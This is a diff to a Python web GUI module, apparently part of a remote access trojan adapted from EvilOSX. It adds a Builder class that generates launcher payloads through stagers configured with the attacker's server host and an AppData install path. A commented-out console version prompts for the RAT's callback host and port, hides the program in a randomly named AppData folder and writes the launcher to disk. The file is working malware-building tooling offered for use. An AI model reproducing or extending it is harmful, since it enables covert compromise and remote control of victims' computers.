@@ -1,7 +1,7 @@
 from threading import Thread
 from server import modules
 from server.model import Command, CommandType
-
+from bot import launchers,loaders
 class webgui():
     def __init__(self,model):
         self._model = model
@@ -132,3 +132,114 @@ class webgui():
         for info in infos:
             keys.append(info[1])
         return keys
+    
+
+
+class Builder:
+    def launcher_list(self):
+        launcher_names = launchers.get_names()
+        return launcher_names
+
+    def loader_list(self):
+        loaders_name = loaders.get_names()
+        print(loaders_name)
+        return loaders_name
+    
+    
+    def loader_infos(self,loader_name):
+        print(loaders.get_option_messages(loader_name))
+        return loaders.get_option_messages(loader_name)
+    
+    def getPostKeyName(self,module_name):
+        infos = loaders.get_option_messages(module_name)
+        keys = []
+        for info in infos:
+            keys.append(info[1])
+        return keys
+
+    def builder(self,selected_launcher,selected_loader,set_options,program_directory,server_host):
+        loader_options = loaders.get_options(selected_loader, set_options)
+        if program_directory == "APPDATA" or program_directory == "":
+            loader_options["program_directory"] = r"%Appdata%\\Launcher"
+        else:
+            loader_options["program_directory"] = program_directory
+        stager = launchers.create_stager(server_host,loader_options)
+        launcher_extension, launcher = launchers.generate(selected_launcher, stager)
+        return launcher,launcher_extension
+
+
+'''
+def builder():
+    server_host = input(MESSAGE_INPUT + "Server host (where EvilOSX will connect to): ") #ServerHost for RAT
+    server_port = int(input(MESSAGE_INPUT + "Server port: ")) #Server Port for RAT
+    program_directory = input(MESSAGE_INPUT + "Where should EvilOSX live? "
+                                              "(Leave empty for ~AppData\.<RANDOM>): ") #File path
+
+    if not program_directory:
+        program_directory = r"%Appdata%//{}".format(launchers.get_random_string()) #This Line of Code creates a random file path in AppData directory
+    
+    # Select a launcher
+    launcher_names = launchers.get_names()
+
+    print(MESSAGE_INFO + "{} available launchers: ".format(len(launcher_names)))
+    for i, launcher_name in enumerate(launcher_names):
+        print("{} = {}".format(str(i), launcher_name))
+
+    while True:
+        try:
+            selected_launcher = input(MESSAGE_INPUT + "Launcher to use (Leave empty for 1): ")
+
+            if not selected_launcher:
+                selected_launcher = 1
+            else:
+                selected_launcher = int(selected_launcher)
+
+            selected_launcher = launcher_names[selected_launcher]
+            break
+        except (ValueError, IndexError):
+            continue
+
+    # Select a loader
+    loader_names = loaders.get_names()
+
+    print(MESSAGE_INFO + "{} available loaders: ".format(len(loader_names)))
+    for i, loader_name in enumerate(loader_names):
+        print("{} = {} ({})".format(str(i), loader_name, loaders.get_info(loader_name)["Description"]))
+
+    while True:
+        try:
+            selected_loader = input(MESSAGE_INPUT + "Loader to use (Leave empty for 0): ")
+
+            if not selected_loader:
+                selected_loader = 0
+            else:
+                selected_loader = int(selected_loader)
+
+            selected_loader = loader_names[selected_loader]
+            break
+        except (ValueError, IndexError):
+            continue
+
+    set_options = []
+
+    for option_message in loaders.get_option_messages(selected_loader):
+        set_options.append(input(MESSAGE_INPUT + option_message))
+
+    # Loader setup
+    loader_options = loaders.get_options(selected_loader, set_options)
+    loader_options["program_directory"] = program_directory
+
+    # Create the launcher
+    print(MESSAGE_INFO + "Creating the \"{}\" launcher...".format(selected_launcher))
+    stager = launchers.create_stager(server_host, server_port, loader_options)
+
+    launcher_extension, launcher = launchers.generate(selected_launcher, stager)
+    launcher_path = path.realpath(path.join(path.dirname(__file__), "data", "builds", "Launcher-{}.{}".format(
+        str(uuid4())[:6], launcher_extension
+    )))
+
+    with open(launcher_path, "w") as output_file:
+        output_file.write(launcher)
+
+    print(MESSAGE_INFO + "Launcher written to: {}".format(launcher_path))
+'''
